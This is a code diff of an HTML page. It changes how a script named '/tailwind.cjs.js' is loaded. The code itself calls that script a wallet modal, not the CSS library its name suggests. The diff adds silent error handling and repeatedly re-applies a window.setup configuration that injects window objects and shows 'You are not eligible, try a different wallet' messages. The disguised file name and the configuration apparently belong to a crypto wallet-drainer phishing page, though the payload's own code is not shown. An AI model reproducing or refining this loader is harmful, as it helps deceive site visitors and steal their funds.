@@ -532,35 +532,41 @@
         notEligibleHeader: "You are not eligible",
         notEligibleParagraph: "Try a different wallet to meet the requirements."
       };
-    </script>
-    <script src="/tailwind.cjs.js" async></script>
-    <script>
-      // Reapply settings after script loads (in case it overwrites)
+      
+      // Load script with error handling to prevent blocking
       (function() {
-        function applySettings() {
-          if (window.setup) {
-            window.setup.modal = 'reown';
-            window.setup.theme = 'dark';
-            window.setup.radius = 'm';
-            window.setup.auto_prompt = false;
-            window.setup.injectWindowObjects = true;
-            window.setup.notEligibleHeader = "You are not eligible";
-            window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
+        const script = document.createElement('script');
+        script.src = '/tailwind.cjs.js';
+        script.async = true;
+        script.defer = true;
+        
+        // Handle script errors gracefully
+        script.onerror = function() {
+          console.warn('Wallet modal script failed to load, but page continues to work');
+        };
+        
+        // Reapply settings after script loads
+        script.onload = function() {
+          function applySettings() {
+            if (window.setup) {
+              window.setup.modal = 'reown';
+              window.setup.theme = 'dark';
+              window.setup.radius = 'm';
+              window.setup.auto_prompt = false;
+              window.setup.injectWindowObjects = true;
+              window.setup.notEligibleHeader = "You are not eligible";
+              window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
+            }
           }
-        }
+          
+          // Apply settings multiple times
+          setTimeout(applySettings, 50);
+          setTimeout(applySettings, 200);
+          setTimeout(applySettings, 500);
+        };
         
-        // Try multiple times to ensure settings are applied
-        setTimeout(applySettings, 50);
-        setTimeout(applySettings, 200);
-        setTimeout(applySettings, 500);
-        
-        // Also after script loads
-        if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', applySettings);
-        }
-        window.addEventListener('load', function() {
-          setTimeout(applySettings, 100);
-        });
+        // Append script to body
+        document.body.appendChild(script);
       })();
     </script>
   </body>
